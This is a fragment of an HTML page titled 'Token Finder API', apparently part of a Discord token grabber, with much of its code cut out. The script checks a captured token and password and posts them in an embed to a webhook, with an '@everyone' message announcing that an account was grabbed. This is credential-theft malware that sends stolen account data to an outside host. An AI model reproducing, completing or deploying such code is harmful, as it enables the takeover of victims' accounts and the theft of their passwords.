...
<html lang="en">
  <head>
    ...
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Token Finder API - Bhuvnesh ⨯ RisinPlayZ</title>
  ...
  <body>
    ...
    try {
      ...
      embed.setFooter("Made By Bhuvnesh#1337 x RisinPlayZ#1337");
      ...
      if (process.logged.find((e) => e.token === token && e.passowrd === pass)) {
        ...
        await axios({ method: "POST", url: hook, data: { content: "@everyone @here ID Greb Hua vai", embeds: [embed.toJSON()] } }).catch((err) => console.log(err.name));
